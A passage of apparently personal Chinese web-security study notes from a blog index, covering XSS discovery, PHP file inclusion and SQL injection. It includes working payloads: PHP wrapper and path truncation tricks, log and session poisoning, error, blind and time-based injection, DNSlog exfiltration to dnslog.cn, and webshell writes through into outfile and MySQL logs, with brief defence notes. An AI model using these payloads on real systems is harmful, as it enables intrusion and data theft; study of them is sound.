plaintext"><table><tr><td class="code"><pre><span class="line">反射型和存储型:都需要经过服务器解析,并与数据库产生交互</span><br><span class="line">DOM型:只需要经过前端解析,不与数据库产生交互</span><br><span class="line">存储型和DOM型:都会将攻击代码长期存在受害者的服务器</span><br><span class="line">反射型:只反射一次代码</span><br></pre></td></tr></table></figure><h2 id="XSS挖掘"><a href="#XSS挖掘" class="headerlink" title="XSS挖掘"></a>XSS挖掘</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.看url参数位置</span><br><span class="line">2.看输入框位置</span><br><span class="line">3.输入123456&lt;&gt;&#x27;&quot;--&gt;右键查看源代码,观察特殊字符在页面的显示情况--&gt;没有显示可能存在DOM型xss,也可能不存在xss--&gt;存在,重点观察特殊字符是否被转义,没有被转义,基本可以判断存在,剩下的只是构造问题,被转移就使用未转义的符号拼接.</span><br><span class="line">输出点位置:</span><br><span class="line">1.输出在尖括号外头</span><br><span class="line">&lt;div&gt;输出点&lt;/div&gt; ---&gt; 需要可以构造标签,不能构造就不存在xss</span><br><span class="line">2.输出在尖括号中 ---&gt;如果输出在&quot;双引号或者&#x27;单引号内部，需要能够闭合引号，如果不能闭合引号，就需要看能否在当前的标签属性中执行js代码，如果不能，就不存在XSS漏洞。如果可以闭合引号，可以构造一个新的属性，使用新的属性的值来执行JS代码，比如事件属性。或者闭合尖括号，构造的新的标签也可以。</span><br><span class="line">3.输出到Script标签中 ---&gt;如果输出在&quot;双引号或者&#x27;单引号内部，需要能够闭合引号，如果可以闭合引号，就可以直接传递进去js代码，使用注释符号(//)，注释掉后面的js代码就可以构造XSS.如果不能闭合引号,需要看当前变量能不能innerHTML或者document.write，插入到网页中，如果可以就可以构造XSS，如果没有，就不存在XSS</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.基于黑名单的过滤和基于白名单的过滤</span><br><span class="line">2.cookie中添加http-only属性 </span><br><span class="line">3.用函数对输入进行实体编码和转义htmlspecialchars(&lt;&gt;&#x27;\&quot;&quot;,ENT_QUOTES);  addslashes(&quot;&#x27;\&quot;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含-个人笔记</title>
      <link href="/2020/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h3><p>通过引入文件时,包含的文件名用户可控,且传入的文件名没有经过合理校验或者校验被绕过.</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含:"></a>本地文件包含:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">包含的文件在本地服务器</span><br></pre></td></tr></table></figure><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含:"></a>远程文件包含:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php.ini开启了allow_url_fopen=on和allow_url_include=on配置,包含文件可以是第三方文件</span><br><span class="line">例如:www.localhost.com/test/test.php?page=http://www.sqli.com/test.txt</span><br></pre></td></tr></table></figure><h4 id="文件包含常见函数"><a href="#文件包含常见函数" class="headerlink" title="文件包含常见函数"></a>文件包含常见函数</h4><p>includerequireinclude_once()require_once()</p><p>file_get_contents()—读文件,右键查看源代码,任意文件读取,不能执行php代码</p><p>Fopen()—$a &#x3D; fopen($_GET[‘page’],’r’);  echo fread($a,200);  同上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include:包含文件不存在,程序继续执行.  include_once:重复调用一个文件,程序只调用一次</span><br><span class="line">require:包含文件不存在,程序停止执行. require_once:重复调用一个文件,程序只调用一次</span><br><span class="line">(出现语法错误都不继续执行,找不到文件include继续执行,require停止执行)</span><br></pre></td></tr></table></figure><h2 id="文件包含目录绕过"><a href="#文件包含目录绕过" class="headerlink" title="文件包含目录绕过"></a>文件包含目录绕过</h2><h4 id="x2F-或者-x2F-过滤"><a href="#x2F-或者-x2F-过滤" class="headerlink" title="..&#x2F; 或者 &#x2F; 过滤"></a>..&#x2F; 或者 &#x2F; 过滤</h4><p>…&#x2F;.&#x2F; 或者..\绕过   ..&#x2F; 过滤 —– \ 绕过 &#x2F; 过滤  </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$path</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">     <span class="keyword">include</span> <span class="variable">$path</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;phpinfo.php&#x27;</span></span><br><span class="line">    &#125;    </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="前缀目录绕过"><a href="#前缀目录绕过" class="headerlink" title="前缀目录绕过"></a>前缀目录绕过</h4><p>..&#x2F;..&#x2F;..&#x2F;…..绕过限制目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$path = &#x27;/test/hello/dir/.././ds/&#x27;.$_GET[&#x27;page&#x27;];</span><br></pre></td></tr></table></figure><h2 id="文件包含后缀绕过"><a href="#文件包含后缀绕过" class="headerlink" title="文件包含后缀绕过"></a>文件包含后缀绕过</h2><h4 id="和-23-截断"><a href="#和-23-截断" class="headerlink" title="?和%23(#)截断"></a>?和%23(#)截断</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">例如: www.localhost.com/test/test.php?page=http:<span class="comment">//www.sqli.com/test.html?</span></span><br><span class="line"> www.localhost.com/test/test.php?page=http:<span class="comment">//www.sqli.com/test.html%23</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$path</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable">$path</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;phpinfo.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>目前无法绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;./action/&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;./action/show.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd%00</span><br><span class="line">需要magic_quotes_gpc=off</span><br><span class="line">php&lt;5.3.4</span><br></pre></td></tr></table></figure><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd././././....../././</span><br><span class="line">php&lt;5.2.8</span><br><span class="line">linux文件名长于4096,windows需要长于256</span><br></pre></td></tr></table></figure><h2 id="PHP文件包含相关协议"><a href="#PHP文件包含相关协议" class="headerlink" title="PHP文件包含相关协议"></a>PHP文件包含相关协议</h2><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用条件:只是读取,需要开启allow_url_fopen,对allow_url_include不做要求</span><br><span class="line">实现效果:将文件数据进行base64加密后在输出</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure><h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要开启allow_url_include=on,对allow_url_fopen不做要求</span><br><span class="line">要开GET提交---BP转换成POST提交</span><br><span class="line">可以用来写马子---&lt;?php file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;)?&gt;</span><br></pre></td></tr></table></figure><h4 id="date-text-x2F-plain"><a href="#date-text-x2F-plain" class="headerlink" title="date:text&#x2F;plain"></a>date:text&#x2F;plain</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件:开启allow_url_fopen=on  allow_url_include=on</span><br><span class="line">1.用法:?file=data:text/plain,&lt;?php 执行内容 ?&gt;</span><br><span class="line">2.用法:?file=data:text/plain;base64,编码后的php代码---base64编码的php代码不能有+号,否则会和url中的+号编码冲突</span><br></pre></td></tr></table></figure><h4 id="zip协议"><a href="#zip协议" class="headerlink" title="zip协议"></a>zip协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将#编码为%23 PHP版本&gt;=5.3.0</span><br><span class="line">用法:?file=zip://[压缩文件路径+压缩文件名]#[压缩文件内的子文件名]</span><br><span class="line">zip://1.zip%231.txt</span><br><span class="line">zip://1.jpg%231.txt</span><br><span class="line">可以用绝对路径也可以用相对路径</span><br></pre></td></tr></table></figure><h4 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://可以用来访问本地文件系统,且不受allow_url_fopen与allow_url_include的影响</span><br><span class="line">用法:?file=file://文件绝对路径</span><br></pre></td></tr></table></figure><h4 id="Phar协议"><a href="#Phar协议" class="headerlink" title="Phar协议:"></a>Phar协议:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用法:?file=phar://压缩包/内部文件</span><br><span class="line">实例:  pahr://xxx.png/shell.php</span><br><span class="line">注意:PHP&gt;=5.3.0压缩包需要zip协议压缩,rar不行,将木马文件压缩后,改为其他人任意格式的文件都可以正常使用.</span><br><span class="line">步骤:写一个一句话木马文件shell.php,然后用zip协议压缩为shell.zip,然后将后缀改为png等其他格式.</span><br></pre></td></tr></table></figure><h2 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到日志文件存放位置(httpd.ini设置,默认开启)---让日志文件插入PHP代码(BP)---包含日志文件</span><br></pre></td></tr></table></figure><h2 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//没有对session过滤 ,BP抓包在session里放php执行代码    </span></span><br><span class="line"><span class="comment">//从phpinfo.php拿到session存放路径--&gt;sess_+(BP中的)PHPSESSID</span></span><br><span class="line"><span class="comment">//包含绝对路径+sess_id</span></span><br></pre></td></tr></table></figure><h2 id="文件包含防御方法"><a href="#文件包含防御方法" class="headerlink" title="文件包含防御方法"></a>文件包含防御方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.PHP中使用open_basedir配置限制访问在指定的区域</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.过滤./\:</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.禁止服务器远程包含文件(allow_url_fopen=off,allow_url_include=off)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.包含的参数值不可控</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-个人笔记</title>
      <link href="/2020/01/07/SQL/SQL%E7%9F%A5%E8%AF%86--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/07/SQL/SQL%E7%9F%A5%E8%AF%86--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB—-SQL注入"><a href="#WEB—-SQL注入" class="headerlink" title="WEB—-SQL注入"></a>WEB—-SQL注入</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>SQL注入基础知识</p></div><h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理:"></a>SQL注入原理:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在过滤不严谨或者没有过滤的情况下,存在用户可控参数拼接了sql语句代入数据库执行,数据库返回结果</span><br></pre></td></tr></table></figure><h3 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数:"></a>过滤函数:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> mysql_real_escape_string() ------转义SQL 语句中使用的字符串中的特殊字符 </span><br><span class="line"></span><br><span class="line">addslashes -------转义单引号，双引号，反斜线，null</span><br><span class="line"></span><br><span class="line">intval()-----转换数据类型为整型</span><br></pre></td></tr></table></figure><h3 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式:"></a>闭合方式:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 &#x27; &quot; --&gt;观察报错信息, 检查闭合的符号和逃逸出来的其他字符</span><br></pre></td></tr></table></figure><h3 id="SQL注入数据类型"><a href="#SQL注入数据类型" class="headerlink" title="SQL注入数据类型:"></a>SQL注入数据类型:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">整型   ?id=1 and 1=1 页面正常--------- ?id=1 and 1=2 页面不正常</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​?id=1   页面1内容       ------------     ?id=2-1        页面1内容</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​用sleep()函数 and sleep(5) 整型正常睡眠</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​&#x27; &quot; 单双引号  整型报错</span><br><span class="line"></span><br><span class="line">字符型 ?id=1 and 1=1 页面正常---------?id=1 and 1=2 页面正常</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​?id=1            页面1内容-----------?id=2-1        页面2内容</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​用sleep()函数 and sleep(5) 字符型不执行</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​&#x27; &quot; 单双引号  </span><br><span class="line"></span><br><span class="line">**原因:单/双引号 强制转换了类型 **</span><br></pre></td></tr></table></figure><h3 id="SQL注入攻击手法"><a href="#SQL注入攻击手法" class="headerlink" title="SQL注入攻击手法:"></a>SQL注入攻击手法:</h3><h4 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a><strong>union 联合注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前提:多个select语句,知道字段列数,页面有显示位</span><br><span class="line"></span><br><span class="line">1. order by 判断列数</span><br><span class="line"></span><br><span class="line">2. 需要构造的sql语句为真,其他为假--达到执行预计语句的作用</span><br><span class="line"></span><br><span class="line">联合注入配合load_file读文件,into outfile写入文件</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h4><h5 id="函数-floor"><a href="#函数-floor" class="headerlink" title="函数:floor()"></a>函数:floor()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原因:攻击者利用了mysql碰到group by ,count( * )语句会建立虚拟表的特性,结合rand()会被计算多次的特殊性,将floor(rand(0)*2)产生预知序列011011记录到虚拟表中,最终引起主键冗余的报错.</span><br><span class="line"></span><br><span class="line">具体:mysql生成一个虚拟表,表中有key,和count的两个字段.key记录主键,count负责计数.当group by在分组时,遇到预知序列的第一个值0,发现0不存在虚拟表中,于是要将0插入分组,插入数据的行为会将rand()再次触发,生成第二个值1,此时1不存在虚拟表中,最终代替插入到表中.接着遇到第三个值1,1存在,直接计数.接下来到第四个值0,0不存在,所以要插入虚拟表,插入触发了rand(),生成第五个值1,代替0插入.此时分组主键有了1,再次插入就会报错:主键不唯一.</span><br></pre></td></tr></table></figure><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and extractvalue(1, concat(0x7e,(      payload    ),0x7e))</span><br><span class="line"></span><br><span class="line">第一个参数是字符串string类型,更改为int型 达到报错目的</span><br></pre></td></tr></table></figure><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and updatexml(1, (concat(0x7e,(   payload  ),0x7e)),1)</span><br><span class="line"></span><br><span class="line">第一个参数是字符串string类型,更改为int型 达到报错目的</span><br></pre></td></tr></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传递一个大于709的值时，函数exp()就会引起一个溢出错误 </span><br></pre></td></tr></table></figure><h4 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a><strong>布尔注入</strong></h4><h5 id="函数"><a href="#函数" class="headerlink" title="函数:"></a>函数:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> length     min      ascill      ord      like     regexp     left  substr</span><br><span class="line"></span><br><span class="line">​and (select ascii( substr ( ( payload), 1, 1 ) ) )   &gt;   105 </span><br></pre></td></tr></table></figure><h4 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a><strong>时间注入</strong></h4><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((payload), 1, 1))=114, sleep(5), 1)</span><br></pre></td></tr></table></figure><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a><strong>二次注入</strong></h4><h5 id="admin’"><a href="#admin’" class="headerlink" title="admin’#"></a>admin’#</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.插入恶意数据时,仅仅只对特殊字符进行转义(例如利用 mysql_escape_string、mysql_real_escape_string转义 ),最终写入数据还是保留了数据本身的恶意内容,主要是利用了mysql自身会把数据中带有的 / 过滤的特性</span><br><span class="line"></span><br><span class="line">2.没有对从数据库中取出的恶意数据进一步检查和处理</span><br><span class="line"></span><br><span class="line">具体:寻找插入数据库并会转义的操作---&gt;寻找另外一处引用这个数据的操作</span><br><span class="line"></span><br><span class="line">例如常见的注册账号,修改密码处</span><br><span class="line"></span><br><span class="line">影响:造成低权限越权高权限账号,引起更大的危害</span><br></pre></td></tr></table></figure><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><strong>宽字节注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用了类似于set names gbk这样得语句,此时mysql数据库就会将Ascii大于128(%df)的字符当作是汉字字符的一部分,从而能吃掉 \ ,单引号或者双引号逃逸</span><br><span class="line">中文三个字节</span><br></pre></td></tr></table></figure><h4 id="Http头部注入"><a href="#Http头部注入" class="headerlink" title="Http头部注入"></a><strong>Http头部注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-Agent       cookie  -----没有对该参数过滤</span><br><span class="line"></span><br><span class="line">x-forwarded-for  client-ip ----构造注入点  </span><br><span class="line"></span><br><span class="line">预防: 正则--\d--过滤非数字     限制长度</span><br></pre></td></tr></table></figure><h4 id="insert-x2F-update注入-操作很危险"><a href="#insert-x2F-update注入-操作很危险" class="headerlink" title="insert&#x2F;update注入(操作很危险)"></a><strong>insert&#x2F;update注入(操作很危险)</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Student(name,age) VALUES (&#x27;bob&#x27;, &#x27;15&#x27;) </span><br><span class="line"></span><br><span class="line">闭合时要注意values中有多少个参数,非注入参数也需要写上占位以及括号 </span><br><span class="line"></span><br><span class="line">原因是:valuers后面的值要和前面的字段一致.</span><br><span class="line"></span><br><span class="line"> UPDATE table SET column=mew_value WHERE column= value </span><br><span class="line"></span><br><span class="line">发现注入点,进行闭合时要检查原本语句中的限制条件有没有因为过滤符号过滤了,导致数据库数据被全部修改</span><br></pre></td></tr></table></figure><h4 id="多语句注入-x2F-堆叠注入"><a href="#多语句注入-x2F-堆叠注入" class="headerlink" title="多语句注入&#x2F;堆叠注入 :"></a>多语句注入&#x2F;堆叠注入 :</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库版本5.0以下,注入方式:通过    ;   随意拼接sql语句</span><br></pre></td></tr></table></figure><h3 id="DNSlog外带-window系统–UNC路径"><a href="#DNSlog外带-window系统–UNC路径" class="headerlink" title="DNSlog外带(window系统–UNC路径)"></a>DNSlog外带(window系统–UNC路径)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解决:SQL盲注,无回显的命令执行,无回显的SSRF</span><br><span class="line"></span><br><span class="line">先决条件:load_file(root权限--开启参数secure_file_priv= ---gpc未开启/不过滤单双引号)</span><br><span class="line"></span><br><span class="line">payload:  load_file(concat(&#x27;\\ \ \ \\\&#x27;,(payload),&#x27;.xxxx.ceye.io \ \abc&#x27;))</span><br><span class="line"></span><br><span class="line">​1.特殊字符(例如@)要用十六进制hex()转换</span><br><span class="line"></span><br><span class="line">​2.字段不能超过63 ---substr截断判断</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例如:查询带有特殊字符,字符超过63位的所有数据库</span><br><span class="line"></span><br><span class="line">select hex(     (select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)      )</span><br><span class="line"></span><br><span class="line">select (substr ((hex((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA))),1,63) )</span><br><span class="line"></span><br><span class="line">select 1, load_file(concat(&#x27;\\\\&#x27;,(substr((hex((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA))),1,63)),&#x27;.13f22c.dnslog.cn\\abc&#x27;))</span><br></pre></td></tr></table></figure><h3 id="Mysql写shell方式-load-file-amp-out-file"><a href="#Mysql写shell方式-load-file-amp-out-file" class="headerlink" title="Mysql写shell方式(load_file&amp;out file)"></a>Mysql写shell方式(load_file&amp;out file)</h3><h4 id="读取文件-load-file"><a href="#读取文件-load-file" class="headerlink" title="读取文件(load_file):"></a><strong>读取文件(load_file):</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">LOAD_FILE(&#x27;../../WWW/sqli-labs-master/sql-connections/db-creds.inc&#x27;)      load_file：联合查询中会占一位，用括号单引号包围路径</span><br><span class="line"></span><br><span class="line">1. show global VARIABLES like ‘%secure_file_priv%’;  </span><br><span class="line"></span><br><span class="line">   查看secure_file_priv 参数是否开启 (默认关闭,需要进入mysql.ini添加secure_file_priv=)</span><br><span class="line"></span><br><span class="line">2. 读取文件需要有完整路径</span><br><span class="line"></span><br><span class="line">   select @@datadir  (该参数指定MySQL的数据文件的存放目录，数据库文件即我们常说的 MySQL data 文件)</span><br><span class="line"></span><br><span class="line">   select @@basedir  --&gt; 该参数指定了安装 MySQL 的安装路径(mysql安装目录)，填写全路径可以解决相对路径所造成的问题。                 </span><br><span class="line"></span><br><span class="line">3. root权限</span><br><span class="line"></span><br><span class="line">4. 没有对单双引号过滤/gpc没开启---绕过---char(ASCILL代替的命令)/字符串转hex()</span><br><span class="line"></span><br><span class="line">5. 读取文件必须小于max_allowed_packet </span><br><span class="line">   **datadir查看basedir的存放位置**</span><br></pre></td></tr></table></figure><h4 id="写入文件-into-outfile"><a href="#写入文件-into-outfile" class="headerlink" title="写入文件(into outfile):"></a><strong>写入文件(into outfile):</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">into outfile：联合查询中不占位，用单引号包围路径</span><br><span class="line"></span><br><span class="line">?id=-1 union select 1,&lt;?php phpinfo();?&gt;, 3 into outfile &#x27;C:/phpstudy/WWW/7.php&#x27; --+</span><br><span class="line"></span><br><span class="line">    1. root权限</span><br><span class="line">    2. 数据库中secure_file_priv= 参数开启</span><br><span class="line">    3. 知道数据库的绝对路径</span><br><span class="line">    4. php.ini中的get_magic_quotes_gpc()函数,即魔术引号未开启/单双引号没被过滤</span><br></pre></td></tr></table></figure><h3 id="Mysql写shell方式-全局日志-amp-慢日志"><a href="#Mysql写shell方式-全局日志-amp-慢日志" class="headerlink" title="Mysql写shell方式(全局日志&amp;慢日志)"></a>Mysql写shell方式(全局日志&amp;慢日志)</h3><h4 id="全局日志"><a href="#全局日志" class="headerlink" title="全局日志"></a>全局日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1.开启参数</span><br><span class="line">secure_file_priv=    ---&gt;&gt;mysql.ini 配置文件</span><br><span class="line">show variables like&#x27;secure_file_priv&#x27;;   ---查看参数是否开启 </span><br><span class="line">2.开启全局日志 </span><br><span class="line">show variables like&#x27;%general%&#x27;;   on/1--&gt;&gt;开启 off/0--&gt;&gt;关闭</span><br><span class="line">set global general_log = on;</span><br><span class="line">set global general_log_file = &#x27;C:/phpstudy/WWW/shell.php&#x27;; 设置全局日志路径</span><br><span class="line">3.新建查询写入shell</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line">原因:mysql会将执行的语句记录到全局日志，从而将shell写入网站目录</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="慢日志"><a href="#慢日志" class="headerlink" title="慢日志"></a>慢日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.开启参数</span><br><span class="line">secure_file_priv=    ---&gt;&gt;mysql.ini 配置文件</span><br><span class="line">2.查看慢查询日志是否开启</span><br><span class="line">show variables like&#x27;%long_query_log%&#x27;</span><br><span class="line">3.开启慢查询日志并修改日志文件的绝对路径</span><br><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_query_log_file =&#x27;C:/phpstudy/WWW/shell1.php&#x27; ;</span><br><span class="line">查询mysql系统时间</span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">向日志写入shell(设置查询时间超过系统时间)</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注入工具-Sqlmap"><a href="#注入工具-Sqlmap" class="headerlink" title="注入工具:Sqlmap"></a>注入工具:Sqlmap</h2><h3 id="参数使用"><a href="#参数使用" class="headerlink" title="参数使用"></a>参数使用</h3><figure class="highlight 